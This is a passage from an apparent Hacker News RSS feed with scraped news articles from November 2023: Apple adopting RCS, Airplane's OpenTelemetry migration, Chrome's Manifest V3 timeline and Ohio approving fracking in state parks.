target="_blank" data-url="https://economictimes.indiatimes.com/tech/technology/google-mocks-apple-in-new-video-for-lack-of-rcs-messaging-support/articleshow/103889306.cms">Google has been particularly critical</a> of Apple's seeming refusal to support what is clearly a better – at least in some respects – universal standard.</p><p>The announcement also comes just days after <a data-analytics-id="inline-link" href="https://www.techradar.com/phones/nothing-has-cheekily-brought-imessage-to-its-android-phone-heres-how" data-before-rewrite-localise="https://www.techradar.com/phones/nothing-has-cheekily-brought-imessage-to-its-android-phone-heres-how">Nothing skirted Apple's RCS rejection</a> and brought iMessage to its Android-based phones.</p><p>At the time, many wondered how Apple CEO <a data-analytics-id="inline-link" href="https://www.techradar.com/tag/tim-cook" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.techradar.com/tag/tim-cook">Tim Cook</a> might react to this "cheeky" move. There's no indication that this is a direct reaction. In fact, it's more likely Apple saw the writing on the wall as the European Union has, with its Digital Markets Act, pressed the tech giant to get in line with multiple standards. The body clearly achieved some success with <a data-analytics-id="inline-link" href="https://www.techradar.com/news/iphone-15-usb-c" data-before-rewrite-localise="https://www.techradar.com/news/iphone-15-usb-c">USB-C ports that are now featured on all iPhone 15</a> models.</p><p>Surely, the EU would've been compelling Apple to adopt RCS in 2024. Now it doesn't have to bother. Apple is on board.</p><p>By the way, no word on if this RCS support will introduce a third message bubble color.</p><h3 id="section-you-might-also-like"><span>You might also like</span></h3><ul><li><a href="https://www.techradar.com/phones/what-is-rcs-messaging-the-imessage-rival-and-sms-text-replacement-explained" data-before-rewrite-localise="https://www.techradar.com/phones/what-is-rcs-messaging-the-imessage-rival-and-sms-text-replacement-explained">What is RCS messaging? The iMessage rival and SMS text ...</a></li><li><a href="https://www.techradar.com/news/nearly-half-of-phones-will-use-rcs-by-2026" data-before-rewrite-localise="https://www.techradar.com/news/nearly-half-of-phones-will-use-rcs-by-2026">Nearly half of phones will use RCS by</a></li><li><a href="https://www.techradar.com/news/google-led-successor-to-sms-is-a-boon-for-mobile-operators" data-before-rewrite-localise="https://www.techradar.com/news/google-led-successor-to-sms-is-a-boon-for-mobile-operators">Google-led successor to SMS is a boon for mobile operators ...</a></li><li><a href="https://www.techradar.com/how-to/tired-of-google-rcs-spam-heres-how-you-can-turn-it-off" data-before-rewrite-localise="https://www.techradar.com/how-to/tired-of-google-rcs-spam-heres-how-you-can-turn-it-off">Tired of Google RCS spam - Here's how you can turn it off</a></li></ul><p><a data-analytics-id="inline-link" target="_blank" href="https://www.tiktok.com/@techradar" data-url="https://www.tiktok.com/@techradar"><em>Follow TechRadar on TikTok</em></a><em>&nbsp;for news, reviews, unboxings, and hot Black Friday deals!</em></p>
</div>
<div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent-37Sgv6D7Uaw7NEpHujEntC"><section><p>Get the hottest deals available in your inbox plus news, reviews, opinion, analysis and more from the TechRadar team.</p></section></div>
<div id="slice-container-authorBio-37Sgv6D7Uaw7NEpHujEntC"><p>A 35-year industry veteran and <a href="https://cdn.mos.cms.futurecdn.net/ox35RKH2kNKBfSBfvHEoK6.jpg">award-winning journalist</a>, Lance has covered technology since PCs were the size of suitcases and “on line” meant “waiting.” He’s a former Lifewire Editor-in-Chief, Mashable Editor-in-Chief, and, before that, Editor in Chief of PCMag.com and Senior Vice President of Content for Ziff Davis, Inc. He also wrote a popular, weekly tech column for Medium called The Upgrade.</p>

<p><a href="https://en.wikipedia.org/wiki/Lance_Ulanoff" target="_blank">Lance Ulanoff</a> makes frequent appearances on national, international, and local news programs including Live with Kelly and Ryan, Fox News, Fox Business, the <a href="https://www.today.com/video/google-glass-is-beginning-of-a-revolution-44496451646" target="_blank">Today Show</a>, Good Morning America, CNBC, CNN, and the BBC.&nbsp;</p></div>



</section>



<div id="slice-container-relatedArticles"><p><h5>Most Popular</h5></p></div>








</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple announces that RCS support is coming to iPhone next year (665 pts)]]></title>
            <link>https://9to5mac.com/2023/11/16/apple-rcs-coming-to-iphone/</link>
            <guid>38293082</guid>
            <pubDate>Thu, 16 Nov 2023 18:04:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://9to5mac.com/2023/11/16/apple-rcs-coming-to-iphone/">https://9to5mac.com/2023/11/16/apple-rcs-coming-to-iphone/</a>, See on <a href="https://news.ycombinator.com/item?id=38293082">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
<figure>
			<img src="https://9to5mac.com/wp-content/uploads/sites/6/2023/11/iphone-android-rcs-1.jpg?quality=82&amp;strip=all&amp;w=1600" srcset="https://i0.wp.com/9to5mac.com/wp-content/uploads/sites/6/2023/11/iphone-android-rcs-1.jpg?w=320&amp;quality=82&amp;strip=all&amp;ssl=1 320w, https://i0.wp.com/9to5mac.com/wp-content/uploads/sites/6/2023/11/iphone-android-rcs-1.jpg?w=640&amp;quality=82&amp;strip=all&amp;ssl=1 640w, https://i0.wp.com/9to5mac.com/wp-content/uploads/sites/6/2023/11/iphone-android-rcs-1.jpg?w=1024&amp;quality=82&amp;strip=all&amp;ssl=1 1024w, https://i0.wp.com/9to5mac.com/wp-content/uploads/sites/6/2023/11/iphone-android-rcs-1.jpg?w=1500&amp;quality=82&amp;strip=all&amp;ssl=1 1500w" width="1600" height="800" alt="" fetchpriority="high">
	
	</figure>

<p>In a surprising move, Apple has announced today that it will adopt the RCS (Rich Communication Services) messaging standard. The feature will launch via a software update “later next year” and bring a wide range of iMessage-style features to messaging between iPhone and Android users.</p>



<p>Apple’s decision comes amid pressure from regulators and competitors like Google and Samsung. It also comes as RCS has continued to develop and become a more mature platform than it once was. </p>



<h2 id="h-rcs-brings-imessage-style-features-to-cross-platform-texts">RCS brings iMessage-style features to cross-platform texts</h2>



<p>In a <strong>statement to <em>9to5Mac</em></strong>, an Apple spokesperson said that the company believes RCS will offer better interoperability for cross-platform messages. </p>



<blockquote>
<p>Later next year, we will be adding support for RCS Universal Profile, the standard as currently published by the GSM Association. We believe RCS Universal Profile will offer a better interoperability experience when compared to SMS or MMS. This will work alongside iMessage, which will continue to be the best and most secure messaging experience for Apple users.</p>
</blockquote>



<p>RCS brings many iMessage-style features to cross-platform messaging between iPhone and Android devices. This includes things like read receipts, typing indicators, high-quality images and videos, and more. </p>



<p>Apple’s implementation of RCS will also give users the ability to share their location with other people inside text threads, the company says. Unlike regular SMS, RCS can work over mobile data or Wi-Fi as well. </p>



<p>But at the same time, iMessage isn’t going anywhere. It will continue to be the messaging platform used for all communication between iPhone users. RCS will simply supplant SMS and MMS and exist separately from iMessage when available. SMS and MMS will also continue to be available as a fallback when needed, Apple says. </p>



<p>This <em>is not</em> Apple opening up iMessage to other platforms. Instead, it’s the company adopting RCS separately from iMessage. </p>



<p>Apple also reiterates that iMessage is far more secure and privacy-friendly than RCS. iMessage is end-to-end encrypted, and Apple just took that up a notch with <a href="https://9to5mac.com/2022/12/07/apple-advanced-data-protection-encryption-imessage-more/">Advanced Data Protection</a> for Messages in iCloud. Meanwhile, Apple says that RCS does not currently support encryption that is as strong as iMessage. </p>



<p>Apple’s decision to adopt RCS follows years of pressure from some of its competitors, <a href="https://9to5mac.com/2023/10/09/samsung-apple-rcs-ad-romeo-and-juliet/">including Samsung</a> and <a href="https://9to5mac.com/2023/05/10/google-apple-rcs-support-iphone/">Google</a>. Until today, the company resisted that pressure and instead doubled down on iMessage. It has, however, rolled out some improvements to the SMS experience between iPhone and Android devices.</p>



<p>For example, Apple added&nbsp;<a href="https://9to5mac.com/2022/06/07/ios-16-tapbacks-will-no-longer-spam-your-sms-group-chats/">better support for Tapbacks in iOS 16</a> for conversations between iPhone and Android users. With iOS 17, <a href="https://9to5google.com/2023/06/06/ios-17-imessage-group-android-improvements/">Apple also brought features</a> such as threaded replies and message editing to iPhone users (but not Android users) in SMS group chats.</p>



<p>Finally, Apple says it will work with the GSMA members on ways to further improve the RCS protocol. This particularly includes improving the security and encryption of RCS messages.</p>



<h2 id="h-9to5mac-s-take">9to5Mac’s Take</h2>



<p>We’ve come a very long way since <a href="https://9to5mac.com/2022/09/07/tim-cook-explains-why-apple-refuses-to-adopt-rcs-buy-your-mom-an-iphone/">Tim Cook’s rebuttal</a> of RCS back in 2022. At the time, Cook said that Apple hadn’t heard from many users “asking us to put a lot of energy” into bringing RCS support to the iPhone. “Buy your mom an iPhone,” Cook said when asked about the lackluster SMS experience. </p>



<p>Later that year, a report from <a href="https://9to5mac.com/2022/12/13/apple-imessage-rcs/"><em>Bloomberg</em> said</a> that Apple was not considering –&nbsp;at least at that time –&nbsp;adding RCS support to iPhone.</p>



<p>The elephant in the room is impending legislation in the European Union that could’ve ultimately <em>required</em> Apple to open up iMessage. Apple has pushed back against this legislation, the Digital Markets Act, arguing that <a href="https://9to5mac.com/2023/09/04/imessage-app-store-gatekeeper-not-big-enough/#:~:text=Report%3A%20Apple%20claims%20iMessage%20not,%27gatekeeper%27%20competition%20law%20%2D%209to5Mac">iMessage is not big enough in Europe</a> to qualify as a “gatekeeper service.”</p>



<p>Just last week, it was reported that Apple is set to appeal to the European Union about the inclusion of its App Store and iMessage services in the Digital Markets Act. Nonetheless, Apple is getting ahead of any potential regulatory problems with today’s announcement.</p>



<p>When RCS support launches later next year, the limitations of SMS and MMS will no longer haunt (most) messaging conversations between iPhone and Android users. Availability can still vary from carrier to carrier, but all three major US carriers support RCS, as do the vast majority of other carriers around the world.</p>



<p>As part of today’s announcement, Apple reiterates its support for other open standards. The company, for instance, has worked closely with the likes of Amazon and Google on the <a href="https://9to5mac.com/2022/10/04/matter-smart-home-apple-homekit-launch/">Matter smart home standard</a>. It’s also worked <a href="https://9to5mac.com/2020/02/11/fido-alliance/">together with the FIDO Alliance</a>, including Microsoft and Google, on <a href="https://9to5mac.com/2022/06/07/passkeys-passwordless-sign-in-ios-16/">expanding support for Passkeys</a>. Apple also played an integral role in developing the <a href="https://9to5mac.com/2023/11/15/first-qi2-accessories-for-iphone-15/">Qi2 wireless charging standard</a>, which is built on top of MagSafe.</p>



<p>As of right now, there’s no word on whether the green bubbles will still be green. My money would be on: yes. </p>



<p>Is Apple right to finally cave to the pressure and adopt RCS, or should the company have held out longer? Let us know in the comments.</p>



<p><strong>Follow Chance</strong>:&nbsp;<a href="https://www.threads.net/@ChanceHMiller">Threads</a>,&nbsp;<a href="https://twitter.com/chancehmiller">Twitter</a>,&nbsp;<a href="https://www.instagram.com/chancehmiller/">Instagram</a>, and&nbsp;<a href="https://mastodon.social/@ChanceHMiller">Mastodon</a>.&nbsp;</p>
	<p>
		<a target="_blank" rel="nofollow" href="https://news.google.com/publications/CAAqBggKMLOFATDAGg?hl=en-US&amp;gl=US&amp;ceid=US:en">
			<em>Add 9to5Mac to your Google News feed.</em>&nbsp;
					</a>
	</p>
	<div><p><em>FTC: We use income earning auto affiliate links.</em> <a href="https://9to5mac.com/about/#affiliate">More.</a></p><p><a href="https://bit.ly/3R0r9Uo"><img src="https://9to5mac.com/wp-content/uploads/sites/6/2023/11/BF_9to5Mac_Apple_750x150-1.png" alt="" width="750" height="150"></a></p></div>				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I spent 3 years working on a coat hanger [video] (644 pts)]]></title>
            <link>https://www.youtube.com/watch?v=vREokZa4dNU</link>
            <guid>38292915</guid>
            <pubDate>Thu, 16 Nov 2023 17:52:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=vREokZa4dNU">https://www.youtube.com/watch?v=vREokZa4dNU</a>, See on <a href="https://news.ycombinator.com/item?id=38292915">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Migrating to OpenTelemetry (229 pts)]]></title>
            <link>https://www.airplane.dev/blog/migrating-to-opentelemetry</link>
            <guid>38292553</guid>
            <pubDate>Thu, 16 Nov 2023 17:29:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.airplane.dev/blog/migrating-to-opentelemetry">https://www.airplane.dev/blog/migrating-to-opentelemetry</a>, See on <a href="https://news.ycombinator.com/item?id=38292553">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>At Airplane, we collect observability data from our own systems as well as remote “agents” that are running in our customers’ infrastructure. The associated outputs, which include the standard <a href="https://www.oreilly.com/library/view/distributed-systems-observability/9781492033431/ch04.html">“three pillars of observability”</a> (logs, metrics, and traces) are essential for us to monitor our infrastructure and also help customers debug problems in theirs.</p>
<p>Over the last year, we’ve made a concerted effort to migrate most of our observability data generation and collection to the <a href="https://opentelemetry.io/">OpenTelemetry (OTel)</a> standard. This has allowed us to collect data more reliably from more places, connect more easily with different vendors, and better monitor and control our costs.</p>
<p>In the remainder of this post, we explain what OpenTelemetry is, how we managed the migration, and lessons we learned along the way.</p>
<h2>Aside: What is OTel?</h2>
<p><a href="https://opentelemetry.io/">OpenTelemetry</a> (or OTel for short) is a set of standards and tools for processing observability data. It starts by defining the basic concepts (e.g., what a metric is) and the protocols for transmitting observability data from one system to another. It then provides a set of SDK libraries that allow for the instrumentation of applications in various programming languages (Python, Java, Golang, etc.) and the pushing of data via the former protocols. Finally, it provides a collector, a centralized component that receives data from various sources, applies arbitrary transformations to it, and exports the data to one or more downstream destinations.</p>
<p>There are a few nice things about OTel that make it superior to legacy observability frameworks.</p>
<p>First, it’s vendor agnostic. In theory, you can instrument a system and export observability data without being concerned about whether it’s ultimately going to Datadog, Splunk, Dynatrace, or some other vendor. And, even better, you can switch between these vendors without rewriting your applications.</p>
<p>Second, it unifies the different types of observability data, so you don’t need separate libraries and implementations for logs, metrics, and traces.</p>
<p>And third, it has fairly solid library support for the most common programming languages and application frameworks.</p>
<h2>Original architecture</h2>
<p><img src="https://airplane.ghost.io/content/images/2023/11/OTel-Infrastructure-Before.png" alt="OTel-Infrastructure-Before.png" loading="lazy"></p>
<p>Before describing our migration to OTel, it’s helpful to summarize what kinds of observability data Airplane has and how we were collecting it pre-migration.</p>
<p>As mentioned in the introduction, Airplane has its own systems, plus “agents” that run in the infrastructure of our customers. We also have Airplane frontend code running in our customers’ browsers. Thus, there are effectively 9 different streams of observability data: <code>{logs, metrics, traces} x {Airplane-hosted infra, customer-hosted infra, customer browsers}</code>. The data collected from these streams is sent to several vendors including <a href="https://www.datadoghq.com/">Datadog</a> (for application logs and metrics), <a href="https://www.honeycomb.io/">Honeycomb</a> (for traces), and <a href="https://cloud.google.com/logging">Google Cloud Logging</a> (for infrastructure logs).</p>
<p>Originally, collection from customer-hosted infrastructure and browsers was minimal. When needed for debugging purposes, the state of these systems was pieced together via their calls to Airplane’s APIs (e.g., to poll for new task runs) plus information that customers supplied to us manually on request (e.g., screenshots of logs).</p>
<p>On the Airplane side, we relied heavily on the <a href="https://docs.datadoghq.com/agent/">Datadog agent</a> for both logs and metrics. The latter is a component that runs on each machine in an organization’s infrastructure, scraping logs and metrics for whatever is running on that machine and sending the data directly to Datadog’s collection APIs.</p>
<p>For metrics, the Datadog agent can either scrape metrics from each process using the <a href="https://github.com/prometheus/docs/blob/main/content/docs/instrumenting/exposition_formats.md#exposition-formats">Prometheus protocol</a> or receive metrics that are pushed to it by each application using a protocol like <a href="https://docs.datadoghq.com/developers/dogstatsd">Statsd</a>. We originally decided to go with the former approach, and thus each of our applications exposed its metrics via an HTTP <code>/metrics</code> endpoint that was periodically read by the agent.</p>
<p>Trace data from Airplane-hosted infrastructure, on the other hand, was sent directly from our API to Honeycomb, our tracing vendor. We were already using OTel libraries for collecting and sending this data (Honeycomb’s API is fully OTel-compliant), so no significant migration was required here. However, we weren’t collecting traces from any systems other than our API, and we wanted to expand that.</p>
<h2>Making the switch</h2>
<p><img src="https://airplane.ghost.io/content/images/2023/11/OTel-Infrastructure-After.png" alt="OTel-Infrastructure-After.png" loading="lazy"></p>
<h2>Setting up the collector</h2>
<p>The first step was to set up an OTel collector in each of our environments. As described previously, this is a component that receives observability data, processes it, and then exports it to vendor-specific collection endpoints for services like Datadog or Honeycomb.</p>
<p>The OTel collector was fairly easy to set up within our existing infrastructure- it’s a golang server that’s configured via a single YAML file. This config file specifies how data is received (e.g., via what protocols and on which ports), how the data should be transformed, and the downstream destinations that the data should be sent to.</p>
<p>The collector config documentation is generally well-written, but spread across a few places- the <a href="https://opentelemetry.io/docs/collector/">official OTel docs site</a>, the <a href="https://github.com/open-telemetry/opentelemetry-collector">collector GitHub repo</a>, and the <a href="https://github.com/open-telemetry/opentelemetry-collector-contrib">“contrib” GitHub repo</a>, which is where most of the vendor-specific integrations are hosted.</p>
<p>After some trial-and-error, we managed to create a config for collecting logs, metrics, and traces, and sending them to Datadog and Honeycomb. The following shows a simplified version with some annotation comments:</p>

<p>Note that the collector has many other features that we decided not to use, particularly around data aggregation and filtering. We may enable these in the future, however, to reduce the data volumes that we send to our vendors downstream.</p>
<p>Once our collector service was up, we put internal and external load balancers in front of it so that both internal services and external agents could send it data.</p>
<h2>Instrumentation</h2>
<p>The next step was to instrument our applications to gather and send useful data to the collector. This was done in a set of small, independent projects, including:</p>
<ol>
<li>Exporting traces from our UI to the collector</li>
<li>Exporting observability data from customer-hosted agents to the collector</li>
<li>Switching metrics in Airplane-hosted systems from Prometheus+Datadog to OTel</li>
</ol>
<p>Our frontend code is written in TypeScript and our backend systems use golang, so this involved integrating the OTel <a href="https://github.com/open-telemetry/opentelemetry-js">JavaScript</a> and <a href="https://github.com/open-telemetry/opentelemetry-go">Go</a> SDKs, respectively. The language-specific <a href="https://opentelemetry.io/docs/instrumentation/">instrumentation guides</a> in the OTel docs were very helpful here.</p>
<p>Switching our internal metrics was the most involved project because it required refactoring the pipelines that provide data for our (heavily used) internal dashboards and alerts. Moreover, we encountered some rough edges in the metrics-related functionality of the Go SDK referenced above. Ultimately, we had to write a conversion layer on top of the OTel metrics API that allowed for simple, Prometheus-like counters, gauges, and histograms.</p>
<p>In the end, we decided to not send certain flows through the collector. In the case of logs from our internal systems, we found that it was easiest to use our cloud provider, Google Cloud Platform (GCP), for collecting and distributing them. GCP’s <a href="https://cloud.google.com/logging">log tooling</a> is pretty powerful and easy to configure for applications in <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine (GKE)</a>, where we host most of our services. GCP is also the source for many of our non-application-based logs (e.g., DB errors), so we would be depending on this service whether or not we used it for application logs.</p>
<p>For internal traces, we decided to keep sending these directly to Honeycomb since Honeycomb already uses the OTel protocol (OTLP) and going through a collector wouldn’t add much value here.</p>
<h2>Parting thoughts</h2>
<p>Overall, we’ve been very happy with our new, OTel-oriented observability stack.</p>
<p>First, the SDKs and collector have been rock solid- we’ve had no significant issues running these at scale in production. As mentioned previously, the Golang SDK does have some rough edges (and doesn’t support logs at all yet), but we were able to get around these without too much trouble by writing some custom code on top of the OTel-provided interfaces.</p>
<p>Second, having an OTel collector has made it much easier to collect and process observability data from systems outside of our infrastructure. These systems can push their data to our collector, and thus we don’t need to worry about writing our own clients and servers for these flows or deal with scraping third-party destinations.</p>
<p>Third, OTel has allowed us to save a significant amount of money on our Datadog bill! Because we now use a centralized collector instead of per-node Datadog agents, the number of hosts that Datadog sees is significantly reduced. At $15 / host / month, we’ve been able to shave thousands off of our monthly Datadog charges.</p>
<p>Fourth, OTel allows us to more easily switch vendors in the future. We stuck with Datadog and Honeycomb during the migration, but it’s nice to know that if we wanted to try out others in the future, we could make that switch fairly easily.</p>
<p>If your organization is processing a lot of observability data, it may be worth investigating OTel as a solution for increased control and flexibility. And if you’re an Airplane user, you can also natively stream audit logs from your Airplane tasks to your OTel collector using our <a href="https://docs.airplane.dev/platform/log-drains">log drains</a> feature.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google resumes transition to Manifest V3 for Chrome extensions (129 pts)]]></title>
            <link>https://developer.chrome.com/blog/resuming-the-transition-to-mv3/</link>
            <guid>38292409</guid>
            <pubDate>Thu, 16 Nov 2023 17:20:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://developer.chrome.com/blog/resuming-the-transition-to-mv3/">https://developer.chrome.com/blog/resuming-the-transition-to-mv3/</a>, See on <a href="https://news.ycombinator.com/item?id=38292409">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>In December of last year, we paused the planned deprecation of Manifest V2 in order to address developer feedback and deliver better solutions to <a href="https://developer.chrome.com/docs/extensions/migrating/known-issues/">migration issues</a>. As a result of this feedback, we’ve made a number of changes to Manifest V3 to <a href="https://developer.chrome.com/blog/chrome-120-beta-whats-new-for-extensions/#closing-the-platform-gap">close these gaps</a>, including:</p><ul><li>Introducing <a href="https://developer.chrome.com/docs/extensions/reference/offscreen/">Offscreen Documents</a>, which provide DOM access for extensions to use in a variety of scenarios like audio playback</li><li>Providing better control over <a href="https://developer.chrome.com/blog/longer-esw-lifetimes/">service worker lifetimes</a> for extensions calling extension APIs or receiving events over a longer period of time</li><li>Adding a new <a href="https://developer.chrome.com/docs/extensions/reference/userScripts/">User Scripts API</a>, which allows userscript manager extensions to more safely allow users to run their scripts</li><li><a href="https://developer.chrome.com/blog/improvements-to-content-filtering-in-manifest-v3/">Improving content filtering support</a> by providing more generous limits in the declarativeNetRequest API for static rulesets and dynamic rules</li></ul><p>In addition to closing gaps, we’ve also added new features to the platform, such as the <a href="https://developer.chrome.com/docs/extensions/reference/sidePanel/">Side Panel API</a>, which shipped earlier this year, and the <a href="https://developer.chrome.com/docs/extensions/reference/readingList/">Reading List API</a>, currently in Beta. We discussed many of these changes recently at the Ad-Filtering Dev Summit, and <a href="https://www.youtube.com/live/Vw1eIaRuy7w?si=ADjrch-S4J9Zp0hH&amp;t=24021">shared</a> more context on the changes and improvements we’ve made based on feedback.</p><p>With these changes in place, we’ve seen support for Manifest V3 increase significantly among the extension developer community. Specifically, we are encouraged by our <a href="https://youtube.com/watch?v=Vw1eIaRuy7w&amp;t=24021s">ongoing dialogue</a> with the developers of content blocking extensions, who initially felt Manifest V3 could impact their ability to provide users with the features they’ve come to expect.</p><p>"<em>With Manifest V3, we've observed the immense effort that browser teams (Chrome in particular, but also other browsers) are putting into working on a unified platform, and I see how they are listening to the feedback from extension developers. As always, migrating to a new platform is a large undertaking, but we're very hopeful that the new unified platform will bring substantial benefits to the entire browser extensions ecosystem, and that ad blockers like us will be able to continue being up to the task and further improve.</em>” - Andrey Meshkov, CTO AdGuard</p><p>Having addressed these migration concerns from our developer community, we are ready to continue moving towards Manifest V3 and the higher security and privacy guarantees it provides. As a result, we are resuming the deprecation timeline.</p><h2 id="the-phase-out-timeline" tabindex="-1"> The phase-out timeline</h2><p>We will begin disabling Manifest V2 extensions in <a href="https://developer.chrome.com/docs/web-platform/chrome-release-channels/">pre-stable versions of Chrome</a> (Dev, Canary, and Beta) as early as <strong>June 2024</strong>, in Chrome 127 and later. Users impacted by the rollout will see Manifest V2 extensions automatically disabled in their browser and will no longer be able to install Manifest V2 extensions from the Chrome Web Store. Also in June 2024, Manifest V2 extensions will lose their Featured badge in the Chrome Web Store if they currently have one.</p><p>We will gradually roll out this change, gathering user feedback and collecting data to make sure Chrome users understand the change and what actions they can take to find alternative, up-to-date extensions.</p><p>We will communicate with developers throughout the rollout, and we will continue to closely monitor feedback during this process. We expect it will take at least a month to observe and stabilize the changes in pre-stable before expanding the rollout to stable channel Chrome, where it will also gradually roll out over time. The exact timing may vary depending on the data collected, and during this time, we will keep you informed about our progress.</p><p>Enterprises using the <a href="https://chromeenterprise.google/policies/#ExtensionManifestV2Availability">ExtensionManifestV2Availability</a> policy to ensure the continued functioning of Manifest V2 extensions in their organization will have one additional year - until June 2025 - to migrate the Manifest V2 extensions in their organization. Browsers with the policy enabled will not be impacted by the rollout of the deprecation until that time.</p><h2 id="next-steps-for-extension-publishers" tabindex="-1"> Next steps for extension publishers</h2><p>For extensions publishers who still publish Manifest V2 extensions, we highly recommend completing migration to Manifest V3 before June 2024. We’ve published a <a href="https://developer.chrome.com/docs/extensions/migrating/">migration guide</a> covering everything you need to know to successfully migrate. For a summary of some of the recent improvements to the Extensions platform, check out our quarterly updates from <a href="https://developer.chrome.com/blog/extension-news-july-2023/">July</a> and <a href="https://developer.chrome.com/blog/extension-news-october-2023/">October</a>. If you have any questions or trouble during the migration, please reach out via <a href="https://developer.chrome.com/docs/extensions/support-feedback/">our support channels</a>.</p><p>In the meantime, we’ll be continuing to release new features and functionality to improve the overall extension development experience.</p><p>Thank you to everyone who gave feedback. This has been invaluable in our work to evolve the platform in pursuit of a safer, more performant, and more privacy-preserving extensions ecosystem.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ohio commission approves fracking in state parks and wildlife areas (119 pts)]]></title>
            <link>https://apnews.com/article/ohio-fracking-state-parks-8b8e73c6918e97e588d44855dc8b47eb</link>
            <guid>38291673</guid>
            <pubDate>Thu, 16 Nov 2023 16:35:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://apnews.com/article/ohio-fracking-state-parks-8b8e73c6918e97e588d44855dc8b47eb">https://apnews.com/article/ohio-fracking-state-parks-8b8e73c6918e97e588d44855dc8b47eb</a>, See on <a href="https://news.ycombinator.com/item?id=38291673">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                                        <p>COLUMBUS, Ohio (AP) — Some state parks can be fracked in Ohio, a decision made by a government commission Wednesday despite an ongoing investigation into claims of possible fraudulent support by an industry group that represents energy companies.</p><p>During a raucous meeting attended by many fracking opponents, the Ohio Oil and Gas Land Management Commission OK’d several parcels for fracking by outside entities — all of them owned by the Ohio Department of Natural Resources and the Ohio Department of Transportation — that include state parks and designated wildlife areas. </p><p>Under state law, the identities of those who nominated the land for oil and gas drilling are confidential. </p>
    

<p>The vote took place during a tense public meeting at which anti-fracking protesters held up signs that read “DENY” and “Save Our Parks.” </p>



<p>Advocates accused the state board members of lacking transparency, upholding the interests of corporate greed and poisoning future generations. Some threw money in front of the commissioners and shouted them out of the state meeting, while others sang protest songs in and chanted “Don’t frack our futures,” and “Shame.” </p>
<p>A member of Save Ohio Parks, Cathy Cowan Becker, said opponents were disappointed by the vote but vowed to continue to show up to meetings. </p><p>“At a time when the science is telling us we have to stop all the oil and gas, instead we’re doing this in our parks,” Cowan Becker said. “We’re rightfully really angry about this.” </p><p>The decision is the first of its kind in Ohio, although laws allowing fracking have been on the books since 2011. </p>
    

<p>Legislation under then- <span><a href="https://apnews.com/hub/john-kasich" target="_blank" rel="noopener">Gov. John Kasich</a></span>, a former Republican presidential candidate, called for a state board to allow state-owned land to be “leased for the exploration for and development and production of oil or natural gas.” </p><p>But the formation of the commission was not formalized during the Kasich administration. In fact, its first meeting did not occur until December of 2022, after current GOP Gov. Mike DeWine signed a bill similar to the 2011 legislation. </p><p>Commission chair Ryan Richardson emphasized in a previous commission meeting that according to the language in the nominated leases, no surface areas of the parks would be disturbed by oil and gas drilling as it would occur underground. </p><p>However, most of the meeting Wednesday was nearly impossible to hear over the boos and chants of environmental advocates in the room.</p><p>A spokesperson for Richardson said she would respond to reporters’ questions later Wednesday. </p>
    

<p>Oil and gas fracking is often a polarizing topic, but ongoing accusations of fraudulent support have added even more tension to the vote.</p><p>A <span><a href="https://www.cleveland.com/open/2023/09/nearly-150-now-say-they-didnt-agree-to-use-their-names-on-pro-fracking-form-letters.html" target="_blank" rel="noopener">Cleveland.com investigation </a></span> in September found that over a hundred Ohio residents said their names were attached to form letters sent to the commission in a public comment period without their knowledge — all of them urging state parks allow fracking.</p><p>Those names included a 9-year-old girl and a blind woman. The form letter, which appears over 1,000 times in the public comment database, urges Ohio to “responsibly” lease rights to minerals under Salt Fork State Park, among other areas. </p><p>The 9-year-old’s mother, Brittany Keep, <span><a href="https://www.cleveland.com/open/2023/09/their-names-appeared-on-letters-urging-fracking-ohios-state-parks-they-dont-know-how.html" target="_blank" rel="noopener">told Cleveland.com</a></span> that her daughter knows nothing about oil and gas exploration and neither of them have visited Salt Fork State Park. </p><p>The letters could be traced back to multiple pro-oil entities, including Consumer Energy Alliance, a Texas-based pro-oil and gas organization. The energy alliance has denied collecting names without permission and has called Cleveland.com’s coverage “libelous.” The nonprofit collects and verifies those names and other demographic data through a third party, according to the group’s spokesperson, Bryson Hull.</p>
    

<p>Citing their contract, the energy group says they cannot reveal who that third party is or the data they collected, Hull said.</p><p>It isn’t the first time the alliance has come under scrutiny for claims it used residents’ names in government petitions and public comments without their knowledge. The group had been accused of the same issue in Wisconsin in 2014, Ohio in 2016 and South Carolina in 2018.</p><p>Ohio Attorney General Dave Yost, a Republican, said in September he would investigate any possible crimes committed through the use of the letters. A spokesperson for Yost, Bethany McCorkle, told The Associated Press Wednesday that “this is still an open investigation” and that “there are not any additional details that can be shared at this time.” </p><p>Environmental advocates and state Democrats have asked Yost to provide an update ahead of the Wednesday vote. </p><p>“A thorough investigation is imperative so Ohioans have confidence that any state process meant to include public input is, in fact, functioning to reflect public opinion and not another conduit for public corruption,” said House Minority Leader Allison Russo in a statement Wednesday. </p>
    

<p>The energy alliance is fully cooperating with Yost’s office, Hull said in September. </p><p>Anyone who comes forward to the commission and can confirm letters in their name were sent without their knowledge are encouraged to contact the commission, said Ohio Department of Natural Resources spokesperson Andy Chow. He said their name will be removed from public comment. </p><p>The approved parcels will now be put into a confidential bidding process, in which organizations can put in their bid to frack on the land. ___</p><p>Samantha Hendrickson is a corps member for the Associated Press/Report for America Statehouse News Initiative. <span><a href="https://www.reportforamerica.org/" target="_blank" rel="noopener">Report for America</a></span> is a nonprofit national service program that places journalists in local newsrooms to report on undercovered issues.</p>
                                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Running Signal will soon cost $50M a year (106 pts)]]></title>
            <link>https://www.wired.com/story/signal-operating-costs/</link>
            <guid>38291490</guid>
            <pubDate>Thu, 16 Nov 2023 16:22:52 GMT</pubDate>
